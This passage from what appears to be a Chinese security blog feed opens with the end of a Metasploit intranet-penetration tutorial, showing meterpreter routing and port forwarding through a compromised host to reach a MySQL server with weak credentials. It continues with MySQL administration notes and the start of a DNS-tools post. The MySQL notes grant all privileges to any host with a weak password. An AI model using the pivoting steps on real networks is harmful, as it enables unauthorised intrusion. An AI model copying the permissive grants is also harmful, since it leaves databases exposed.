<p>说明：1表示session 1，攻击机如果要去访问10.0.0.0/8网段的资源，其下一跳是session1，至于什么是下一条这里不多说了，反正就是目前攻击机可以访问内网资源了。</p>
<h4 id="meterpreter端口转发"><a href="#meterpreter端口转发" class="headerlink" title="meterpreter端口转发"></a>meterpreter端口转发</h4><p>假设目前我们扫描到了10网段的某个ip存在mysql弱口令，账号密码都有了，那么我们可以在肉鸡服务器上登陆目标服务器mysql。当然，如果我想在攻击机上去登陆mysql，可以使用端口转发。（某些情况下，内网的机器也不能互相ssh，需要登陆堡垒机）</p>
<p>在meterpreter shell中输入：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; portfwd add -l 55555 -r 10.0.0.1 -p 3306</div></pre></td></tr></table></figure></p>
<p>表示将10.0.0.1服务器上的3306端口转发到本地的55555端口，然后我们可以在本地运行mysql –h 127.0.0.1 –u root –P 55555 –p 去登陆mysql。其他端口如ssh、ftp等都类似，这个过程跟msf代理很像。</p>
<p><em>网络上关于metasploit用法的资料很多，这里主要记录一些常用用法，以及个人使用过程中的一些坑</em></p>
<p>参考文章：<br><a href="http://www.freebuf.com/sectool/72135.html" target="_blank" rel="external">http://www.freebuf.com/sectool/72135.html</a><br><a href="http://blog.csdn.net/lzhd24/article/details/50664342" target="_blank" rel="external">http://blog.csdn.net/lzhd24/article/details/50664342</a><br><a href="http://blog.csdn.net/qq_34457594/article/details/52756458" target="_blank" rel="external">http://blog.csdn.net/qq_34457594/article/details/52756458</a><br><a href="http://www.freebuf.com/sectool/56432.html" target="_blank" rel="external">http://www.freebuf.com/sectool/56432.html</a><br><a href="http://www.freebuf.com/articles/network/125278.html" target="_blank" rel="external">http://www.freebuf.com/articles/network/125278.html</a></p>
<h3 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h3><p><a href="http://thief.one/2017/07/12/1/">【渗透神器系列】DNS信息查询</a><br><a href="http://thief.one/2017/04/10/1/">【渗透神器系列】nc</a><br><a href="http://thief.one/2017/05/02/1/">【渗透神器系列】nmap</a><br><a href="http://thief.one/2017/04/27/1">【渗透神器系列】Fiddler</a><br><a href="http://thief.one/2017/05/19/1">【渗透神器系列】搜索引擎</a><br><a href="http://thief.one/2017/02/09/WireShark%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99/">【渗透神器系列】WireShark</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Learn to walk before you run&lt;br&gt;先学走，再学跑&lt;/blockquote&gt;&lt;br&gt;　　今天玩了一把内网渗透，其中主要用到了metasploit这款内网渗透神器。metasploit大家肯定不陌生，我也在很早之前就有接触过，但每次重新使用它时都会遗忘一些用法，因此为了方便查询我在本篇记录下metasploit神器的一些常用命令，以及内网渗透中如何使用它。&lt;br&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://thief.one/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="渗透神器" scheme="http://thief.one/tags/%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/"/>
    
      <category term="metasploit" scheme="http://thief.one/tags/metasploit/"/>
    
  </entry>
  
  <entry>
    <title>Mysql相关笔记</title>
    <link href="http://thief.one/2017/07/26/1/"/>
    <id>http://thief.one/2017/07/26/1/</id>
    <published>2017-07-26T06:45:30.000Z</published>
    <updated>2017-07-28T09:13:18.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Take control of your own desting<br>命运掌握在自己手上</blockquote><br>　　最近由于项目需要，特地研究了下mysql数据库。虽然大学期间曾学习过mysql，但由于之前开发一直用rethinkdb以及mongodb数据库，因此对mysql已经有些生疏了。最近在使用期间也遇到了很多坑，但幸好最终还是靠着强大的Google解决了所有问题。因此在此记录下mysql相关问题的一些笔记，其中可能会涉及Mysql安全相关的问题，比如利用mysql导出shell、mysql提权等，权当备份。<br><a id="more"></a></p>
<h2 id="Mysql基础命令"><a href="#Mysql基础命令" class="headerlink" title="Mysql基础命令"></a>Mysql基础命令</h2><p>想要mysql玩得6，mysql命令行必须会用，或者说sql必须会，一起复习一下吧。</p>
<h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><p>查看数据库：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">show databases;</div></pre></td></tr></table></figure></p>
<p>使用数据库：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">use  数据库名称;</div></pre></td></tr></table></figure></p>
<p>新建数据库：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">CREATE DATABASE mydb;</div></pre></td></tr></table></figure></p>
<p>删除数据库：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DROP DATABASE mydb;</div></pre></td></tr></table></figure></p>
<h3 id="数据库表操作"><a href="#数据库表操作" class="headerlink" title="数据库表操作"></a>数据库表操作</h3><p>查看当前数据库表：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">show tables;</div></pre></td></tr></table></figure></p>
<p>创建数据表：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">CREATE TABLE teacher(</div><div class="line">id int primary key auto_increment,</div><div class="line">name varchar(20),</div><div class="line">gender char(1),</div><div class="line">age int(2),</div><div class="line">birth date,</div><div class="line">description varchar(100),</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>查看表结构：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">desc  表名;</div></pre></td></tr></table></figure></p>
<p>删除表（DROP TABLE语句）：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DROP TABLE teacher;</div></pre></td></tr></table></figure></p>
<p>注：drop table 语句会删除该的所有记录及表结构</p>
<p>修改表结构（ALTER TABLE语句）：</p>
<ul>
<li>alter table test add column job varchar(10); –添加表列</li>
<li>alter table test rename test1; –修改表名</li>
<li>alter table test drop column name; –删除表列</li>
<li>alter table test modify address char(10) –修改表列类型（改类型）</li>
<li>alter table test change address address1  char(40) –修改表列类型（改名字和类型，和下面的一行效果一样）</li>
<li>alter table test change column address address1 varchar(30)–修改表列名（改名字和类型）</li>
</ul>
<h3 id="数据操作"><a href="#数据操作" class="headerlink" title="数据操作"></a>数据操作</h3><p>添加数据：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">INSERT INTO 表名(字段1,字段2,字段3) values(值，值，值);</div></pre></td></tr></table></figure></p>
<p>查询数据：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from 表名;</div></pre></td></tr></table></figure></p>
<p>修改数据：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UPDATE 表名 SET 字段1名=值,字段2名=值,字段3名=值 <span class="built_in">where</span> 字段名=值;</div></pre></td></tr></table></figure></p>
<p>删除数据：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DELETE FROM 表名;</div></pre></td></tr></table></figure></p>
<p><em>以上命令是最最基础的，但也是最常用的</em></p>
<h2 id="Mysql使用权限问题"><a href="#Mysql使用权限问题" class="headerlink" title="Mysql使用权限问题"></a>Mysql使用权限问题</h2><h3 id="只能本地连接mysql，远程机器连接不了？"><a href="#只能本地连接mysql，远程机器连接不了？" class="headerlink" title="只能本地连接mysql，远程机器连接不了？"></a>只能本地连接mysql，远程机器连接不了？</h3><p>当我在服务器上搭建好mysql，输入以下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[root@ ~]<span class="comment"># mysql -u root -p</span></div><div class="line">Enter password:</div><div class="line">mysql&gt;</div></pre></td></tr></table></figure></p>
<p>当输入mysql密码，出现mysql&gt;提示后，说明已经成功登陆mysql。</p>
<p>我满心欢喜地打开自己的mac，准备远程连接服务器上的mysql，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[Mac~]mysql -u root -p -h 192.168.2.2</div><div class="line">Enter password: </div><div class="line">ERROR 1045 (28000): Access denied <span class="keyword">for</span> user <span class="string">'root'</span>@<span class="string">'192.168.2.2'</span> (using password: YES)</div></pre></td></tr></table></figure></p>
<p>显示登陆失败，原因是mysql默认只支持本地登陆，不支持远程登陆。</p>
<h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>第一步，登陆mysql（服务器本地登陆，因为远程登陆不了），查看user表（内置表）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">mysql&gt; use mysql;  <span class="comment">#选择mysql数据库（mysql是数据库名称）</span></div><div class="line">mysql&gt; select host,user,password from user; <span class="comment">#(查看user表中的内容)</span></div><div class="line">+-----------+------------+-------------------------------------------+</div><div class="line">| host      | user       | password                                  |</div><div class="line">+-----------+------------+-------------------------------------------+</div><div class="line">| localhost | root       | *21D8392A6B4CA12B9D194ED3E245258C4BE56DBA |</div><div class="line">| 127.0.0.1 | root       | *930D8392A6B4CA12B9D194ED3E245258C4BE56DB |</div><div class="line">+-----------+------------+-------------------------------------------+</div><div class="line">5 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt;</div></pre></td></tr></table></figure></p>
<p>可以看到，user表中目前只有一个root用户，并且host为127.0.0.1/localhost，也就是说root用户目前只支持本地ip访问连接。</p>
<p>第二步，修改表内容</p>
<p>增加一个用户，将host设置为%<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;CREATE USER <span class="string">'nmask'</span>@<span class="string">'%'</span> IDENTIFIED BY <span class="string">'123456'</span>;</div></pre></td></tr></table></figure></p>
<p>或者更改root用户的host字段内容<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;update user <span class="built_in">set</span> host = <span class="string">'%'</span> <span class="built_in">where</span> user = <span class="string">'root'</span>;</div></pre></td></tr></table></figure></p>
<p>flush(必须要flush，使之生效)：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;flush privileges;</div></pre></td></tr></table></figure></p>
<p>查看用户<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select host,user from mysql.user;</div></pre></td></tr></table></figure></p>
<p>再看下user表内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select host,user,password from user;</div><div class="line">+-----------+------------+-------------------------------------------+</div><div class="line">| host      | user       | password                                  |</div><div class="line">+-----------+------------+-------------------------------------------+</div><div class="line">| localhost | root       | *21D8392A6B4CA12B9D194ED3E245258C4BE56DBA |</div><div class="line">| 127.0.0.1 | root       | *930D8392A6B4CA12B9D194ED3E245258C4BE56DB |</div><div class="line">| %         | nmask      | *435A8F39F0791250895CA1DE2068FDC2CB477122 |</div><div class="line">+-----------+------------+-------------------------------------------+</div><div class="line">5 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</div></pre></td></tr></table></figure></p>
<p>可以看到user表中增加了一个用户nmask，host为%。</p>
<p>重启Mysql：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo /etc/init.d/mysqld restart</div></pre></td></tr></table></figure></p>
<p>此时再用nmask用户远程连接下Mysql：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mysql -u nmask -p -h 192.168.2.2</div><div class="line">Enter password: </div><div class="line">mysql&gt;</div></pre></td></tr></table></figure></p>
<p>连接成功，因为此用户host内容为%，表示允许任何主机访问此mysql服务。</p>
<h3 id="用户权限很低"><a href="#用户权限很低" class="headerlink" title="用户权限很低"></a>用户权限很低</h3><p>当我用nmask账号登陆后，发现权限很低，具体表现为只能看到information_schema数据库。</p>
<h4 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h4><p>在添加此用户时，就赋予其权限<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql&gt;INSERT INTO user</div><div class="line">    -&gt;     VALUES(<span class="string">'%'</span>,<span class="string">'nmask'</span>,PASSWORD(<span class="string">'123456'</span>),</div><div class="line">    -&gt;     <span class="string">'Y'</span>,<span class="string">'Y'</span>,<span class="string">'Y'</span>,<span class="string">'Y'</span>,<span class="string">'Y'</span>,<span class="string">'Y'</span>,<span class="string">'Y'</span>,<span class="string">'Y'</span>,<span class="string">'Y'</span>,<span class="string">'Y'</span>,<span class="string">'Y'</span>,<span class="string">'Y'</span>,<span class="string">'Y'</span>,<span class="string">'Y'</span>);</div><div class="line">mysql&gt;flush privileges;</div></pre></td></tr></table></figure></p>
<p>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mysql&gt;CREATE USER <span class="string">'nmask'</span>@<span class="string">'%'</span> IDENTIFIED BY <span class="string">'123456'</span>;</div><div class="line">mysql&gt;GRANT ALL PRIVILEGES ON *.* TO <span class="string">'nmask'</span>@<span class="string">'%'</span> WITH GRANT OPTION;</div><div class="line">mysql&gt;flush privileges;</div></pre></td></tr></table></figure></p>
<p>如果是phpmyadmin，可以通过root用户登陆后，进入user表进行修改。</p>
<p>最后重启Mysql：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo /etc/init.d/mysqld restart</div></pre></td></tr></table></figure></p>
<h3 id="自定义授权问题"><a href="#自定义授权问题" class="headerlink" title="自定义授权问题"></a>自定义授权问题</h3><p>如果想nmask使用123456密码从任何主机连接到mysql服务器，其他密码不行，则可以：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt;GRANT ALL PRIVILEGES ON *.* TO <span class="string">'nmask'</span>@<span class="string">'%'</span> IDENTIFIED BY <span class="string">'123456'</span> WITH GRANT OPTION;</div><div class="line">mysql&gt;flush privileges;</div></pre></td></tr></table></figure></p>
<p>如果想允许用户nmask只能从ip为10.0.0.1的主机连接到mysql服务器，并只能使用123456作为密码。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt;GRANT ALL PRIVILEGES ON *.* TO <span class="string">'nmask'</span>@<span class="string">'10.0.0.1'</span> IDENTIFIED BY <span class="string">'123456'</span> WITH GRANT OPTION;</div><div class="line">mysql&gt;flush privileges;</div></pre></td></tr></table></figure></p>
<p>最后重启Mysql：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo /etc/init.d/mysqld restart</div></pre></td></tr></table></figure></p>
<h3 id="只能连接localhost？"><a href="#只能连接localhost？" class="headerlink" title="只能连接localhost？"></a>只能连接localhost？</h3><p>连接报错信息：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ERROR 2003 (HY000): Can<span class="string">'t connect to MySQL server on '</span>192.168.10.2<span class="string">' (111) 不能用192.168.10.2去连接。</span></div></pre></td></tr></table></figure></p>
<h4 id="解决方案-2"><a href="#解决方案-2" class="headerlink" title="解决方案"></a>解决方案</h4><p>修改/etc/my.cnf内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bind_address=127.0.0.1 改成 bind_address=192.168.10.2</div></pre></td></tr></table></figure></p>
<p>重启mysql服务：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo /etc/init.d/mysqld restart</div></pre></td></tr></table></figure></p>
<p><em>脱坑秘籍：通过mysql命令行修改内容后，要记得plush；如果还不生效，尝试restart mysql服务</em></p>
<h2 id="Mysql性能优化"><a href="#Mysql性能优化" class="headerlink" title="Mysql性能优化"></a>Mysql性能优化</h2><h3 id="mysql-insert加速"><a href="#mysql-insert加速" class="headerlink" title="mysql insert加速"></a>mysql insert加速</h3><p>　　insert是操作数据库最常用的动作，当有大量数据需要插入数据库时，性能至关重要，即插入数据的速度。mysql insert性能优化参考：<a href="http://blog.jobbole.com/29432/" target="_blank" rel="external">http://blog.jobbole.com/29432/</a></p>
<h4 id="方案：一条SQL语句插入多条数据（亲测有效）"><a href="#方案：一条SQL语句插入多条数据（亲测有效）" class="headerlink" title="方案：一条SQL语句插入多条数据（亲测有效）"></a>方案：一条SQL语句插入多条数据（亲测有效）</h4><p>将sql语句修改成以下类型，即一条sql语句插入多条数据，可大大提高插入效率。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">INSERT INTO `insert_table` (`datetime`, `uid`, `content`, `<span class="built_in">type</span>`) VALUES (<span class="string">'0'</span>, <span class="string">'userid_0'</span>, <span class="string">'content_0'</span>, 0), (<span class="string">'1'</span>, <span class="string">'userid_1'</span>, <span class="string">'content_1'</span>, 1);</div></pre></td></tr></table></figure></p>
<p>修改后的插入操作能够提高程序的插入效率。这里第二种SQL执行效率高的主要原因有两个，一是减少SQL语句解析的操作， 只需要解析一次就能进行数据的插入操作，二是SQL语句较短，可以减少网络传输的IO。</p>
<h4 id="方案：在事务中进行插入处理"><a href="#方案：在事务中进行插入处理" class="headerlink" title="方案：在事务中进行插入处理"></a>方案：在事务中进行插入处理</h4><p>插入改成以下内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">START TRANSACTION;</div><div class="line">INSERT INTO `insert_table` (`datetime`, `uid`, `content`, `<span class="built_in">type</span>`) VALUES (<span class="string">'0'</span>, <span class="string">'userid_0'</span>, <span class="string">'content_0'</span>, 0);</div><div class="line">INSERT INTO `insert_table` (`datetime`, `uid`, `content`, `<span class="built_in">type</span>`) VALUES (<span class="string">'1'</span>, <span class="string">'userid_1'</span>, <span class="string">'content_1'</span>, 1);</div><div class="line">...</div><div class="line">COMMIT;</div></pre></td></tr></table></figure></p>
<p>　　使用事务可以提高数据的插入效率，这是因为进行一个INSERT操作时，MySQL内部会建立一个事务，在事务内进行真正插入处理。通过使用事务可以减少创建事务的消耗，所有插入都在执行后才进行提交操作。</p>
<p>注意事项：</p>
<ol>
<li>SQL语句是有长度限制，在进行数据合并在同一SQL中务必不能超过SQL长度限制，通过max_allowed_packet配置可以修改，默认是1M。</li>
<li>事务需要控制大小，事务太大可能会影响执行的效率。MySQL有innodb_log_buffer_size配置项，超过这个值会日志会使用磁盘数据，这时，效率会有所下降。所以比较好的做法是，在事务大小达到配置项数据级前进行事务提交。</li>
</ol>
<h2 id="Python操作Mysql"><a href="#Python操作Mysql" class="headerlink" title="Python操作Mysql"></a>Python操作Mysql</h2><p>利用python开发时，经常会用到跟mysql相关的操作，这时候需要利用第三方库，MySQLdb。</p>
<h3 id="MySQLdb安装"><a href="#MySQLdb安装" class="headerlink" title="MySQLdb安装"></a>MySQLdb安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo pip install mysql-python</div></pre></td></tr></table></figure>
<p>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install python-mysqldb</div></pre></td></tr></table></figure></p>
<h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><p>导入模块<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">import MySQLdb</div></pre></td></tr></table></figure></p>
<p>连接mysql数据库<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">conn=MySQLdb.connect(host=<span class="string">"localhost"</span>,user=<span class="string">"root"</span>,passwd=<span class="string">"root"</span>,db=<span class="string">"test"</span>,charset=<span class="string">"utf8"</span>,connect_timeout=10)  <span class="comment">#connec_timeout连接超时时间  </span></div><div class="line">cursor = conn.cursor()</div></pre></td></tr></table></figure></p>
<p>创建表结构<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sql = <span class="string">"create table if not exists user(name varchar(128) primary key, created int(10))"</span>  </div><div class="line">cursor.execute(sql)</div></pre></td></tr></table></figure></p>
<p>往表中写入数据<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">sql = <span class="string">"insert into user(name,created) values(%s,%s)"</span>     </div><div class="line">param = (<span class="string">"aaa"</span>,int(time.time()))      </div><div class="line">n = cursor.execute(sql,param)      </div><div class="line">cursor.close()</div><div class="line">conn.commit()    <span class="comment">#必须要commit，不然数据只会缓存在本地，而不会真正的插入数据库</span></div></pre></td></tr></table></figure></p>
<p>往表中写入多行数据<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sql = <span class="string">"insert into user(name,created) values(%s,%s)"</span>     </div><div class="line">param = ((<span class="string">"bbb"</span>,int(time.time())), (<span class="string">"ccc"</span>,33), (<span class="string">"ddd"</span>,44) )  </div><div class="line">n = cursor.executemany(sql,param)</div></pre></td></tr></table></figure></p>
<p>更新表中数据<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sql = <span class="string">"update user set name=%s where name='aaa'"</span>     </div><div class="line">param = (<span class="string">"zzz"</span>)      </div><div class="line">n = cursor.execute(sql,param)</div></pre></td></tr></table></figure></p>
<p>查询表中数据<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">n = cursor.execute(<span class="string">"select * from user"</span>)      </div><div class="line"><span class="keyword">for</span> row <span class="keyword">in</span> cursor.fetchall():      </div><div class="line">    <span class="built_in">print</span> row  </div><div class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> row:      </div><div class="line">        <span class="built_in">print</span> r</div></pre></td></tr></table></figure></p>
<p>删除表中数据<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sql = <span class="string">"delete from user where name=%s"</span>     </div><div class="line">param =(<span class="string">"bbb"</span>)      </div><div class="line">n = cursor.execute(sql,param)</div></pre></td></tr></table></figure></p>
<p>删除表<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sql = <span class="string">"drop table if exists user"</span>  </div><div class="line">cursor.execute(sql)</div></pre></td></tr></table></figure></p>
<p>提交commit<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">conn.commit()</div></pre></td></tr></table></figure></p>
<p>关闭连接<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">conn.close()</div></pre></td></tr></table></figure></p>
<h3 id="Python操作mysql优化问题"><a href="#Python操作mysql优化问题" class="headerlink" title="Python操作mysql优化问题"></a>Python操作mysql优化问题</h3><p>1、commit操作放在最后，或者循环外面<br>2、使用executemany，插入多条数据</p>
<h2 id="时间墙"><a href="#时间墙" class="headerlink" title="时间墙"></a>时间墙</h2><p>@2017.07.28　　添加mysql权限问题内容<br>@2017.07.29　　添加mysql基础命令、mysql性能优化、python操作mysql</p>
<p><em>本文将会持续添加mysql有关的问题</em></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Take control of your own desting&lt;br&gt;命运掌握在自己手上&lt;/blockquote&gt;&lt;br&gt;　　最近由于项目需要，特地研究了下mysql数据库。虽然大学期间曾学习过mysql，但由于之前开发一直用rethinkdb以及mongodb数据库，因此对mysql已经有些生疏了。最近在使用期间也遇到了很多坑，但幸好最终还是靠着强大的Google解决了所有问题。因此在此记录下mysql相关问题的一些笔记，其中可能会涉及Mysql安全相关的问题，比如利用mysql导出shell、mysql提权等，权当备份。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://thief.one/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="mysql" scheme="http://thief.one/tags/mysql/"/>
    
      <category term="数据库" scheme="http://thief.one/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>【渗透神器系列】DNS信息查询</title>
    <link href="http://thief.one/2017/07/12/1/"/>
    <id>http://thief.one/2017/07/12/1/</id>
    <published>2017-07-12T08:29:12.000Z</published>
    <updated>2017-08-01T12:19:11.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Never put off what you can do today until tomorrow<br>今日事今日毕</blockquote><br>　　好久没有写文章啦，最近忙着换工作，搞事情，麻烦事一大推，凑空整理一篇DNS信息查询等工具用法吧。DNS查询在渗透或者运维工作经常遇到，尤其是内部有DNS服务器的公司，需要定时监测DNS解析的是否正常，有无被DNS劫持的情况。因此，学会一些工具快速查询检测DNS服务器状况显得尤为重要，本篇就介绍几款常见的DNS信息查询工具。<br><a id="more"></a></p>
<h3 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h3><p>　　nslookup是用来监测网络中DNS服务器是否可以实现域名解析的工具，简单来说可以获取域名对应的ip。与ping的区别在于，nslookup返回的结果更丰富，而且主要针对dns服务器的排错，收集dns服务器的信息。（其实ping的过程也去请求了dns的记录，然后对ip发送icmp数据包）</p>
<h4 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h4><h5 id="非交互式（直接在shell中输入查询）："><a href="#非交互式（直接在shell中输入查询）：" class="headerlink" title="非交互式（直接在shell中输入查询）："></a>非交互式（直接在shell中输入查询）：</h5><p>查询thief.one域名对应的ip，这里指定了前往114.114.114.114－dns服务器进行查询。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nslookup thief.one 114.114.114.114</div></pre></td></tr></table></figure></p>
<p><img src="/upload_image/20170712/3.png" alt=""><br>查询thief.one域名DNS服务商。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nslookup -<span class="built_in">type</span>=ns thief.one</div></pre></td></tr></table></figure></p>
<p><img src="/upload_image/20170712/1.png" alt=""><br>查询thief.one的邮件服务器。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nslookup -<span class="built_in">type</span>=mx thief.one</div></pre></td></tr></table></figure></p>
<p><img src="/upload_image/20170712/2.png" alt=""></p>
<h5 id="交互式（先输入nslookup，然后再输入命令）："><a href="#交互式（先输入nslookup，然后再输入命令）：" class="headerlink" title="交互式（先输入nslookup，然后再输入命令）："></a>交互式（先输入nslookup，然后再输入命令）：</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nslookup</div><div class="line">&gt;</div></pre></td></tr></table></figure>
